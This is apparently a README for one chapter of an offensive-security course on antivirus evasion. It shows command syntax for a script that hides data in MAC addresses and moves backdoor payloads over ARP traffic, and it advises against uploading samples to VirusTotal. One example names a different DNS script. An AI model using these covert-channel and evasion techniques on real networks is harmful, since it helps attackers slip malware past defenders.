# Course : Bypassing Anti Viruses by C#.NET Programming

Part 2 (Infil/Exfiltration/Transferring Techniques by C#)  , Chapter 8 : Transferring Backdoor Payloads by ARP Traffic

eBook : Bypassing Anti Viruses by C#.NET Programming

eBook chapter 8 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH8

Related Video : 

Video 1 for chapter 8: 

Video 2 for chapter 8:



Warning :Don't Use "www.virustotal.com" or something like that , Never Ever ;D

Recommended:

STEP 1 : Use each AV one by one in your LAB .

STEP 2 : after "AV Signature Database Updated" your Internet Connection should be "Disconnect" .

STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for test .

# Syntax :

Example Step1: (Client Side ) ./NativePayload_ARP.sh -s text-file eth0 delay x"

Example Step2: (Server Side ) ./NativePayload_ARP.sh -a vboxnet target-IPv4 "

example IPv4:192.168.56.101 : ./NativePayload_ARP.sh -s mytext.txt eth0 delay 3"

example IPv4:192.168.56.1 : ./NativePayload_DNS2.sh -a vboxnet 192.168.56.101 "

Description: with Step1 you will inject Data to MAC address for eth0 , with Step2 you can have this text file via Scanning target-system by ARP traffic (Using Arping tool)"



![](https://github.com/DamonMohammadbagher/NativePayload_ARP/blob/master/Chapter%208%20-%20Transferring%20Backdoor%20Payloads%20by%20ARP%20Traffic/x1.png)


![](https://github.com/DamonMohammadbagher/NativePayload_ARP/blob/master/Chapter%208%20-%20Transferring%20Backdoor%20Payloads%20by%20ARP%20Traffic/x2.png)
